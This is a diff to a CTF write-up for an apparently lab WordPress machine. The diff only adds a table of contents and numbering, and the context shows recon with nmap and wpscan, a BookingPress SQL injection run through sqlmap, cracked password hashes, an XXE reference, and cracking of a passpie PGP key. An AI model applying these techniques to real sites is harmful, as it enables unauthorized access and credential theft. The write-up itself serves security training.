@@ -5,10 +5,24 @@ author = "greatmoves"
 tags = ["linux", "easy", "wpscan", "wordpress", "sqli", "sqlmap", "johntheripper", "gpg2john", "passpie", "ftp"]
 date = 2023-02-26
 +++
+- [1. Initial recon](#1-initial-recon)
+  - [1.1. nmap](#11-nmap)
+  - [1.2. nikto](#12-nikto)
+  - [1.3. website recon](#13-website-recon)
+    - [1.3.1. wpscan](#131-wpscan)
+- [2. user.txt](#2-usertxt)
+  - [2.1. Exploiting WordPress](#21-exploiting-wordpress)
+    - [2.1.1. BookingPress SQLi](#211-bookingpress-sqli)
+      - [2.1.1.1. SQLmap](#2111-sqlmap)
+      - [2.1.1.2. johntheripper](#2112-johntheripper)
+    - [2.1.2. Authenticated XXE Within the Media Library](#212-authenticated-xxe-within-the-media-library)
+- [3. root.txt](#3-roottxt)
+  - [3.1. passpie](#31-passpie)
+  - [3.2. gpg2john](#32-gpg2john)
 
-# Initial recon
+# 1. Initial recon
 
-## nmap
+## 1.1. nmap
 `nmap -sC -sV 10.10.11.186`
 ```
 PORT   STATE SERVICE VERSION
@@ -28,16 +42,16 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.18.0
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-## nikto
+## 1.2. nikto
 `nikto -host 10.10.11.186`
 ```
 + Server: nginx/1.18.0
 + Root page / redirects to: http://metapress.htb/
 ```
-## website recon
+## 1.3. website recon
 We can see at the bottom of the page "Proudly powered by WordPress" so let's run wpscan
 
-### wpscan
+### 1.3.1. wpscan
 `wpscan --url metapress.htb -e u,vp --api-token API_TOKEN --plugins-detection mixed`
 
 ```
@@ -90,11 +104,11 @@ We can see at the bottom of the page "Proudly powered by WordPress" so let's run
  ...
  ```
 
-# user.txt
+# 2. user.txt
 
-## Exploiting WordPress
+## 2.1. Exploiting WordPress
 
-### BookingPress SQLi
+### 2.1.1. BookingPress SQLi
 
 The first WordPress exploit is the SQL injection found in the plugin BookingPress.
 
@@ -106,7 +120,7 @@ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
 ```
 by adding in the `-x http://127.0.0.1:8080` we are able to capture this request using BurpSuite Intercept. From BurpSuite we are able to save the request to a file `req.txt` so that it can be used with `sqlmap`
 
-#### SQLmap
+#### 2.1.1.1. SQLmap
 First we'll use SQLmap to enumerate the databases: `sqlmap -r req.txt -p total_service --dbs`
 ```
 available databases [2]:
@@ -140,7 +154,7 @@ Table: wp_users
 ```
 Now we've got the hashes for the `admin` and `manager` passwords, so let's crack these.
 
-#### johntheripper
+#### 2.1.1.2. johntheripper
 Let's place the two hashes into a file called `hash.txt`
 ```
 $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
@@ -150,7 +164,7 @@ Then run johntheripper: `john hash.txt --wordlist=/usr/share/wordlists/rockyou.t
 
 John is able to crack the manager's password hash as `partylikearockstar` so let's login at `http://metapress.htb/wp-admin/`
 
-### Authenticated XXE Within the Media Library
+### 2.1.2. Authenticated XXE Within the Media Library
 
 From our WPScan results we know there is another vulnerability within the media library. The detailed proof of concept for this vulnerability is available on [WPScan](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5) to read.
 
@@ -193,9 +207,9 @@ now let's use these to ssh into the machine
 
 `user.txt` can be found at `/home/jnelson`
 
-# root.txt
+# 3. root.txt
 
-## passpie
+## 3.1. passpie
 
 a simple `ls -la` in `/home/jnelson` reveals a `.passpie` directory. from there we can find `/home/jnelson/.passpie/.keys`
 
@@ -215,7 +229,7 @@ o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
 
 then we can use johntheripper again to crack this key
 
-## gpg2john
+## 3.2. gpg2john
 
 Using the command `gpg2john keys > pgphash`, where `keys` is the pgp private key, we can convert the key to a hash that johntheripper can crack.
 
